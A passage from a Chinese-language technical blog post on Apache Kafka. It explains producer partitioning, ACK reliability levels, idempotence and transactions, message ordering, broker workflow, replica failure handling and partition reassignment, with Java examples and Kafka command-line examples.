Partition</strong>（黏性分区器），会<strong>随机</strong>选择一个分区，并尽可能一直使用该分区，待该分区的batch已满或者已完成，Kafka再随机一个分区进行使用（和上一次的分区<strong>不同</strong>）。<ul><li>例如：第一次随机选择0号分区，等0号分区当前批次满了（默认16k）或者linger.ms设置的时间到， Kafka再随机一个分区进行使用（如果还是0会继续随机）。</li></ul></li></ul><p>查看send方法的参数<strong>ProducerRecord的构造方法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指明partition的情况下，直接将指明的值作为partition值；例如partition=0，所有数据写入分区0</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProducerRecord</span><span class="params">(String topic, Integer partition, Long timestamp, K key, V value, Iterable&lt;Header&gt; headers)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProducerRecord</span><span class="params">(String topic, Integer partition, Long timestamp, K key, V value)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProducerRecord</span><span class="params">(String topic, Integer partition, K key, V value, Iterable&lt;Header&gt; headers)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProducerRecord</span><span class="params">(String topic, Integer partition, K key, V value)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//没有指明partition值但有key的情况下，将key的hash值与topic的partition数进行取余得到partition值</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProducerRecord</span><span class="params">(String topic, K key, V value)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//采用Sticky Partition（黏性分区器），会随机选择一个分区</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProducerRecord</span><span class="params">(String topic, V value)</span></span><br></pre></td></tr></table></figure><hr><p><strong>自定义分区器：</strong></p><ol><li><p>定义类实现 Partitioner 接口。 </p></li><li><p>重写 partition()方法。</p></li><li><p>使用分区器的方法，在生产者的配置中添加分区器参数。<code>properties.setProperty(ProducerConfig.PARTITIONER_CLASS_CONFIG,&quot;top.nanzx.kafka.producer.MyPartitioner&quot;);</code></p></li></ol><h2 id="生产经验"><a href="#生产经验" class="headerlink" title="生产经验"></a>生产经验</h2><h3 id="提高吞吐量"><a href="#提高吞吐量" class="headerlink" title="提高吞吐量"></a>提高吞吐量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据需求选择合适参数：        </span></span><br><span class="line">        <span class="comment">// batch.size：批次大小，默认16K</span></span><br><span class="line">        properties.put(ProducerConfig.BATCH_SIZE_CONFIG, <span class="number">16384</span>);</span><br><span class="line">        <span class="comment">// linger.ms：等待时间，默认0ms</span></span><br><span class="line">        properties.put(ProducerConfig.LINGER_MS_CONFIG, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// buffer.memory：RecordAccumulator缓冲区大小，默认 32M</span></span><br><span class="line">        properties.put(ProducerConfig.BUFFER_MEMORY_CONFIG,<span class="number">33554432</span>);</span><br><span class="line">        <span class="comment">// compression.type：压缩，默认 none，可配置值 gzip、snappy、lz4 和 zstd</span></span><br><span class="line">        properties.put(ProducerConfig.COMPRESSION_TYPE_CONFIG,<span class="string">&quot;snappy&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="数据可靠性（ACK应答机制）"><a href="#数据可靠性（ACK应答机制）" class="headerlink" title="数据可靠性（ACK应答机制）"></a>数据可靠性（ACK应答机制）</h3><blockquote><p>ACK应答级别：</p><ul><li><p>0：生产者发送过来的数据，不需要等数据落盘应答。<strong>可靠性差，效率高；</strong></p></li><li><p>1：生产者发送过来的数据，Leader收到数据后应答。<strong>可靠性中等，效率中等；</strong></p></li><li><p>-1（all）：生产者发送过来的数据，Leader和ISR队列里面的所有节点收齐数据后应答。<strong>可靠性高，效率低；</strong></p></li></ul></blockquote><p><strong>acks&#x3D;0</strong>，生产者发送过来数据就不管了：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220301223217.png"></p><hr><p><strong>acks&#x3D;1</strong>，生产者发送过来数据Leader应答：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220301223231.png"></p><hr><p><strong>acks&#x3D;-1（all）</strong>，生产者发送过来数据Leader和ISR队列里面所有Follwer应答：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220301223931.png"></p><p><strong>思考</strong>：Leader收到数据，所有Follower都开始同步数据，但有一个Follower，因为某种故障，迟迟不能与Leader进行同步，那这个问题怎么解决呢？</p><p>Leader维护了一个动态的<strong>in-sync replica set（ISR）</strong>：和Leader<strong>保持同步</strong>的Follower+Leader集合(leader:0,isr:0,1,2)。</p><p>如果Follower长时间未向Leader发送通信请求或同步数据，则该Follower将被踢出ISR。该时间阈值由<code>replica.lag.time.max.ms</code>参数设定，默认30s。例如2超时，(leader:0, isr:0,1)。</p><p>这样就不用等长期联系不上或者已经故障的节点。</p><p><strong>总结：</strong>在生产环境中，acks&#x3D;0 很少使用；acks&#x3D;1 一般用于传输普通日志，允许丢个别数据；acks&#x3D;-1，一般用于传输和钱相关的数据，对可靠性要求比较高的场景。</p><p><strong>数据可靠性分析：</strong></p><p>如果分区副本设置为1个，或者ISR里应答的最小副本数量（ min.insync.replicas 默认为1）设置为1，和ack&#x3D;1的效果是一样的，仍然有丢数的风险（leader：0，isr：0）。</p><blockquote><p><strong>数据完全可靠条件 &#x3D; ACK级别设置为-1 + 分区副本大于等于2 + ISR里应答的最小副本数量大于等于2</strong></p></blockquote><hr><h3 id="数据去重（幂等性和事务）"><a href="#数据去重（幂等性和事务）" class="headerlink" title="数据去重（幂等性和事务）"></a>数据去重（幂等性和事务）</h3><p><strong>数据重复分析：</strong></p><p>acks： -1（all）：生产者发送过来的数据，Leader和ISR队列里面的所有节点收齐数据后应答。</p><p>Leader和ISR队列里面的所有节点收齐数据后Leader准备应答时挂了，Producer没有收到ack应答，于是重新给新Leader节点发送数据造成数据重复。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220302201453.png"></p><p><strong>数据传递语义：</strong></p><p>• 至少一次（At Least Once）&#x3D; ACK级别设置为-1 + 分区副本大于等于2 + ISR里应答的最小副本数量大于等于2 （数据完全可靠条件），可以保证数据不丢失，但是不能保证数据不重复</p><p>• 最多一次（At Most Once）&#x3D; ACK级别设置为0 ，可以保证数据不重复，但是不能保证数据不丢失。</p><p>• 精确一次（Exactly Once）：对于一些非常重要的信息，比如和钱相关的数据，要求数据既不能重复也不丢失。</p><blockquote><p>Kafka 0.11版本以后，引入了一项重大特性：<strong>幂等性</strong>和<strong>事务</strong>。</p></blockquote><hr><p><strong>幂等性</strong></p><p>幂等性是指Producer不论向Broker发送多少次重复数据，Broker端都只会持久化一条，保证了不重复。</p><p>精确一次（Exactly Once） &#x3D; 幂等性 + 至少一次（ ack&#x3D;-1 + 分区副本数&gt;&#x3D;2 + ISR最小副本数量&gt;&#x3D;2） 。 </p><p><strong>重复数据的判断标准</strong>：具有<code>&lt;PID, Partition, SeqNumber&gt;</code>相同主键的消息提交时，Broker只会持久化一条。其中PID是Kafka每次重启都会分配一个新的；Partition 表示分区号；Sequence Number是单调自增的。</p><p>所以幂等性只能保证的是在<strong>单分区单会话</strong>内不重复。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220302204338.png"></p><p><strong>如何使用幂等性：</strong>开启参数 <strong>enable.idempotence</strong> 默认为 true，false 关闭。</p><hr><p><strong>事务</strong></p><p>幂等性只能保证单分区单会话，远远不够，跨分区跨会话仍会导致数据重复问题，因此引入事务。</p><p><strong>说明：开启事务，必须开启幂等性。</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220302220620.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomProducerTransaction</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 创建 kafka 生产者的配置对象</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 给 kafka 配置对象添加配置信息：bootstrap.servers</span></span><br><span class="line">    properties.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;192.168.2.110:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// key,value 序列化（必须）</span></span><br><span class="line">    properties.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line">    properties.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置事务 id（必须），事务 id 任意起名</span></span><br><span class="line">    properties.put(ProducerConfig.TRANSACTIONAL_ID_CONFIG, <span class="string">&quot;transaction_id_0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 创建 kafka 生产者对象</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化事务</span></span><br><span class="line">    producer.initTransactions();</span><br><span class="line">    <span class="comment">// 开启事务</span></span><br><span class="line">    producer.beginTransaction();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 4. 调用 send 方法,发送消息</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;firstTopic&quot;</span>, <span class="string">&quot;Test&quot;</span> + i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 提交事务</span></span><br><span class="line">        producer.commitTransaction();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 终止事务</span></span><br><span class="line">        producer.abortTransaction();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 5. 关闭资源</span></span><br><span class="line">        producer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="数据有序"><a href="#数据有序" class="headerlink" title="数据有序"></a>数据有序</h3><p><strong>单分区内有序</strong>，但多分区时，分区与分区间无序是无序的。</p><p>为了保证多分区时数据有序，有两种解决方案：</p><ul><li>生产者端统一采用<strong>一个分区</strong>发送请求</li><li>消费者端对请求重排序，保证数据的有序处理，但是效率低下，需要等待请求全部送达</li></ul><p>kafka在1.x版本之前保证数据单分区有序，条件如下：</p><ul><li><code>max.in.flight.requests.per.connection</code>&#x3D;1（不需要考虑是否开启幂等性，因为只有一个请求）。</li></ul><p>kafka在1.x及以后版本保证数据单分区有序，条件如下：</p><ul><li><p>开启幂等性：<code>max.in.flight.requests.per.connection</code>需要设置小于等于5。 </p></li><li><p>未开启幂等性：<code>max.in.flight.requests.per.connection</code>需要设置为1。</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220302221914.png"></p><p>原因说明：在kafka1.x以后，启用幂等后，kafka服务端会缓存producer发来的最近5个request的元数据并进行排序，故无论如何，都可以保证最近5个request的数据都是有序的。</p><hr><h1 id="Kafka-Broker"><a href="#Kafka-Broker" class="headerlink" title="Kafka Broker"></a>Kafka Broker</h1><h2 id="Broker-工作流程"><a href="#Broker-工作流程" class="headerlink" title="Broker 工作流程"></a>Broker 工作流程</h2><p>启动 Zookeeper 客户端，使用 ls 命令在kafka目录下（配置文件中连接ZK时的设置），可以查看 Zookeeper 存储的 Kafka 相关信息：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220302233820.png"></p><ul><li>Zookeeper 中会记录整个集群中那些 broker 可用&#x2F;上线【&#x2F;brokers&#x2F;ids[0,1,2]】，0 1 2表示broker的id，在kafka配置文件指定</li><li>也会记录每一个 partition 中的 leader 信息以及动态维护的<strong>in-sync replica set（ISR）</strong>（和Leader<strong>保持同步</strong>的Follower+Leader集合）【&#x2F;brokers&#x2F;topics&#x2F;主题名称&#x2F;partition&#x2F;第几个分区&#x2F;state】</li></ul><hr><p> <strong>Broker总体工作流程：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220302234808.png"></p><ol><li>每台 broker 启动后在 ZK 节点中注册</li><li>每个broker都有各自的Controller模块，抢占 ZK 节点的controller ，谁先注册谁就是Controller Leader</li><li>选举出来的 Controller 监听 brokers 节点变化</li><li>Controller 决定副本 Leader 的选举，以<strong>在 ISR 中存活为前提</strong>，按照 AR （Assigned Replica，Kafka分区中所有副本的统称）中<strong>排在最前面</strong>的优先。</li><li>将Leader 副本信息和 ISR 信息上传到 ZK 中存储</li><li>其他 Controller节点从 ZK 中同步消息，防止Controller Leader挂了，随时准备成为Leader</li><li>Producer向Leader发送信息，Follower主动向Leader同步信息。同步信息在底层以1G的Segmen的log文件配合index文件的方式进行存储。</li><li>如果 Leader 所在的 broker 挂了，Controller Leader监听到 ZK 注册的节点发生了变化，会获取 ISR 再重新选举Leader 副本并更新 ZK 中的Leader信息以及 ISR（ISR为前提，<strong>AR为先后顺序</strong>）</li></ol><h2 id="Broker-重要参数列表"><a href="#Broker-重要参数列表" class="headerlink" title="Broker 重要参数列表"></a>Broker 重要参数列表</h2><table><thead><tr><th>参数名称</th><th>描述</th></tr></thead><tbody><tr><td>replica.lag.time.max.ms</td><td>ISR 中，如果 Follower 长时间未向 Leader 发送通信请求或同步数据，则该 Follower 将被踢出 ISR。该时间阈值默认是 <strong>30s</strong>。</td></tr><tr><td>auto.leader.rebalance.enable</td><td>默认是 true。 自动 Leader Partition 平衡。</td></tr><tr><td>leader.imbalance.per.broker.percentage</td><td>**默认是 10%**。每个 broker 允许的不平衡的 leader的比率。如果每个 broker 超过了这个值，控制器会触发 leader 的平衡。</td></tr><tr><td>leader.imbalance.check.interval.seconds</td><td><strong>默认值 300 秒</strong>。检查 leader 负载是否平衡的间隔时间。</td></tr><tr><td>log.segment.bytes</td><td>Kafka 中 log 日志是分成一块块存储的，此配置是指 log 日志划分成块的大小，<strong>默认值 1G</strong>。</td></tr><tr><td>log.index.interval.bytes</td><td><strong>默认 4kb</strong>，kafka 里面每当写入了 4kb 大小的日志（.log），然后就往 index 文件里面记录一个索引。</td></tr><tr><td>log.retention.hours</td><td>Kafka 中数据保存的时间，<strong>默认 7 天</strong>。</td></tr><tr><td>log.retention.minutes</td><td>Kafka 中数据保存的时间，<strong>分钟级别</strong>，默认关闭。</td></tr><tr><td>log.retention.ms</td><td>Kafka 中数据保存的时间，<strong>毫秒级别</strong>，默认关闭。</td></tr><tr><td>log.retention.check.interval.ms</td><td>检查数据是否保存超时的间隔，<strong>默认是 5 分钟</strong>。</td></tr><tr><td>log.retention.bytes</td><td><strong>默认等于-1，表示无穷大</strong>。超过设置的所有日志总大小，删除最早的 segment。</td></tr><tr><td>log.cleanup.policy</td><td><strong>默认是 delete</strong>，表示所有数据启用删除策略；<br/>如果设置值为 compact，表示所有数据启用压缩策略。</td></tr><tr><td>num.io.threads</td><td>负责写磁盘的线程数，<strong>默认是 8</strong>。这个参数值占总核数的 50%</td></tr><tr><td>num.replica.fetchers</td><td>副本拉取线程数，这个参数占总核数的 50%的 1&#x2F;3</td></tr><tr><td>num.network.threads</td><td>数据传输线程数，<strong>默认是 3</strong>。这个参数占总核数的50%的 2&#x2F;3 。</td></tr><tr><td>log.flush.interval.messages</td><td>强制页缓存刷写到磁盘的条数，默认是 long 的最大值，9223372036854775807。一般不建议修改，交给系统自己管理。</td></tr><tr><td>log.flush.interval.ms</td><td>每隔多久刷数据到磁盘，默认是 null。一般不建议修改，交给系统自己管理。</td></tr></tbody></table><h2 id="Kafka-副本"><a href="#Kafka-副本" class="headerlink" title="Kafka 副本"></a>Kafka 副本</h2><ul><li><p>Kafka 副本作用：提高数据可靠性。 </p></li><li><p>Kafka 默认副本 1 个，生产环境一般配置为 2 个，保证数据可靠性；太多副本会增加磁盘存储空间，增加网络上数据传输，降低效率。</p></li><li><p>Kafka 中副本分为：Leader 和 Follower。Kafka 生产者只会把数据发往 Leader，然后 Follower 找 Leader 进行同步数据。</p></li><li><p>Kafka 分区中的所有副本统称为 AR（Assigned Repllicas）。</p><ul><li><p>AR &#x3D; ISR + OSR</p></li><li><p><strong>ISR</strong>，表示和 Leader 保持同步的 Follower 集合。如果 Follower 长时间未向 Leader 发送通信请求或同步数据，则该 Follower 将被踢出 ISR。该时间阈值由 <strong>replica.lag.time.max.ms</strong>参数设定，默认 30s。Leader 发生故障之后，就会从 ISR 中选举新的 Leader。</p></li><li><p><strong>OSR</strong>，表示 Follower 与 Leader 副本同步时，延迟过多的副本。</p></li></ul></li></ul><hr><h3 id="Leader-和-Follower-故障处理细节"><a href="#Leader-和-Follower-故障处理细节" class="headerlink" title="Leader 和 Follower 故障处理细节"></a>Leader 和 Follower 故障处理细节</h3><ul><li><p>Offset：消息在对应 Topic 中的偏移量</p></li><li><p>LEO（Log End Offset）：每个副本的最后一个offset，LEO其实就是最新的offset + 1。</p></li><li><p>HW（High Watermark）：所有副本中最小的LEO 。</p></li></ul><p><strong>Follower故障：</strong></p><p>（1） Follower发生故障后会被临时踢出ISR</p><p>（2） 这个期间Leader和Follower继续接收数据</p><p>（3）待该Follower恢复后，Follower会读取本地磁盘记录的上次的HW，并将log文件高于HW的部分截取掉，从HW开始向Leader进行同步。</p><p>（4）等该Follower的LEO大于等于该Partition的HW，即Follower追上Leader之后，就可以重新加入ISR了。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220304233728.png"></p><p><strong>Leader故障：</strong></p><p>（1） Leader发生故障之后，会从ISR中选出一个新的Leader</p><p>（2）为保证多个副本之间的数据一致性，其余的Follower会先将各自的log文件高于HW的部分截掉，然后从新的Leader同步数据。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220304233744.png"></p><p><strong>注意：</strong>这只能保证副本之间的数据一致性，并不能保证数据不丢失或者不重复。</p><hr><h3 id="分区副本分配"><a href="#分区副本分配" class="headerlink" title="分区副本分配"></a>分区副本分配</h3><p>如果 kafka 服务器只有 4 个节点，那么设置 kafka 的分区数大于服务器台数，在 kafka底层如何分配存储副本呢？</p><p>创建一个新的 topic，16 分区，3 个副本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --partitions 16 --replication-factor 3 --topic second</span><br><span class="line"></span><br><span class="line">[nanzx kafka]$ bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe --topic second</span><br><span class="line">Topic: second4 Partition: 0 Leader: 0 Replicas: 0,1,2 Isr: 0,1,2</span><br><span class="line">Topic: second4 Partition: 1 Leader: 1 Replicas: 1,2,3 Isr: 1,2,3</span><br><span class="line">Topic: second4 Partition: 2 Leader: 2 Replicas: 2,3,0 Isr: 2,3,0</span><br><span class="line">Topic: second4 Partition: 3 Leader: 3 Replicas: 3,0,1 Isr: 3,0,1</span><br><span class="line">Topic: second4 Partition: 4 Leader: 0 Replicas: 0,2,3 Isr: 0,2,3</span><br><span class="line">Topic: second4 Partition: 5 Leader: 1 Replicas: 1,3,0 Isr: 1,3,0</span><br><span class="line">Topic: second4 Partition: 6 Leader: 2 Replicas: 2,0,1 Isr: 2,0,1</span><br><span class="line">Topic: second4 Partition: 7 Leader: 3 Replicas: 3,1,2 Isr: 3,1,2</span><br><span class="line">Topic: second4 Partition: 8 Leader: 0 Replicas: 0,3,1 Isr: 0,3,1</span><br><span class="line">Topic: second4 Partition: 9 Leader: 1 Replicas: 1,0,2 Isr: 1,0,2</span><br><span class="line">Topic: second4 Partition: 10 Leader: 2 Replicas: 2,1,3 Isr: 2,1,3</span><br><span class="line">Topic: second4 Partition: 11 Leader: 3 Replicas: 3,2,0 Isr: 3,2,0</span><br><span class="line">Topic: second4 Partition: 12 Leader: 0 Replicas: 0,1,2 Isr: 0,1,2</span><br><span class="line">Topic: second4 Partition: 13 Leader: 1 Replicas: 1,2,3 Isr: 1,2,3</span><br><span class="line">Topic: second4 Partition: 14 Leader: 2 Replicas: 2,3,0 Isr: 2,3,0</span><br><span class="line">Topic: second4 Partition: 15 Leader: 3 Replicas: 3,0,1 Isr: 3,0,1</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220305161930.png"></p><hr><h3 id="手动调整分区副本存储"><a href="#手动调整分区副本存储" class="headerlink" title="手动调整分区副本存储"></a>手动调整分区副本存储</h3><ul><li><p>当有节点服役和退役时，副本应如何重新分配（使用生成的副本存储计划）；</p></li><li><p>在生产环境中，每台服务器的配置和性能不一致，但是Kafka只会根据自己的代码规则创建对应的分区副本，就会导致个别服务器存储压力较大。所以需要手动调整分区副本的存储（自己指定副本存储计划）。</p></li><li><p>在生产环境当中，由于某个主题的重要等级需要提升，我们考虑增加副本。副本数的增加需要先制定计划，然后根据计划执行（自己指定副本存储计划）。</p></li></ul><p>创建一个主题需要均衡的json文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ vim topics-to-move.json</span><br><span class="line">&#123;</span><br><span class="line"> &quot;topics&quot;: [</span><br><span class="line"> &#123;&quot;topic&quot;: &quot;first&quot;&#125;</span><br><span class="line"> ],</span><br><span class="line"> &quot;version&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成一个负载均衡的计划（–broker-list是选择将副本分配到哪些broker上）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-reassign-partitions.sh --bootstrap-server 127.0.0.1:9092 --topics-to-move-json-file topics-to-move.json --broker-list &quot;0,1,2,3&quot; --generate</span><br><span class="line">Current partition replica assignment</span><br><span class="line">&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[0,2,1],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;,&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[2,1,0],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;,&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:2,&quot;replicas&quot;:[1,0,2],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;]&#125;</span><br><span class="line">Proposed partition reassignment configuration</span><br><span class="line">&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[2,3,0],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;,&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[3,0,1],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;,&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:2,&quot;replicas&quot;:[0,1,2],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;]&#125;</span><br></pre></td></tr></table></figure><p>创建副本存储计划（使用生成的计划将所有副本存储在 broker0、broker1、broker2、broker3 中）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ vim increase-replication-factor.json</span><br><span class="line">&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[2,3,0],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;,&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[3,0,1],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;,&#123;&quot;topic&quot;:&quot;first&quot;,&quot;partition&quot;:2,&quot;replicas&quot;:[0,1,2],&quot;log_dirs&quot;:[&quot;any&quot;,&quot;any&quot;,&quot;any&quot;]&#125;]&#125;</span><br></pre></td></tr></table></figure><p>执行副本存储计划</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-reassign-partitions.sh --bootstrap-server 127.0.0.1:9092 --reassignment-json-file increase-replication-factor.json --execute</span><br></pre></td></tr></table></figure><p>验证副本存储计划</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-reassign-partitions.sh --bootstrap-server 127.0.0.1:9092 --reassignment-json-file increase-replication-factor.json --verify</span><br><span class="line">Status of partition reassignment:</span><br><span class="line">Reassignment of partition first-0 is complete.</span><br><span class="line">Reassignment of partition first-1 is complete.</span><br><span class="line">Reassignment of partition first-2 is complete.</span><br><span class="line">Clearing broker-level throttles on brokers 0,1,2,3</span><br><span class="line">Clearing topic-level throttles on topic first</span><br></pre></td></tr></table></figure><hr><h3 id="Leader-Partition自动平衡"><a href="#Leader-Partition自动平衡" class="headerlink" title="Leader Partition自动平衡"></a>Leader Partition自动平衡</h3><p>正常情况下，Kafka本身会自动把Leader Partition均匀分散在各个机器上，来保证每台机器的读写吞吐量都是均匀的。但是如果某些broker宕机，会导致Leader Partition过于集中在其他少部分几台broker上，这会导致少数几台broker的读写请求压力过高，其他宕机的broker重启之后都是follower partition，读写请求很低，造成集群负载不均衡。</p><blockquote><p>• auto.leader.rebalance.enable，默认是true。自动 Leader Partition 平衡。</p><p>• leader.imbalance.per.broker.percentage，默认是10%。每个broker允许的不平衡的leader的比率。如果每个broker超过了这个值，控制器会触发leader的平衡。</p><p>• leader.imbalance.check.interval.seconds，默认值300秒。检查leader负载是否平衡的间隔时间。</p></blockquote><p>下面拿一个主题举例说明，假设集群只有一个主题如下图所示：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220305205620.png"></p><p>分区2的<strong>AR优先副本是0节点</strong>（第三行，replicas可以理解成AR），但是0节点却不是Leader节点，所以broker0节点的不平衡数加1，AR副本总数是4，所以broker0节点不平衡率为1&#x2F;4&gt;10%，需要再平衡。</p><p>broker2和broker3节点和broker0不平衡率一样，需要再平衡。Broker1的不平衡数为0，不需要再平衡。</p><h2 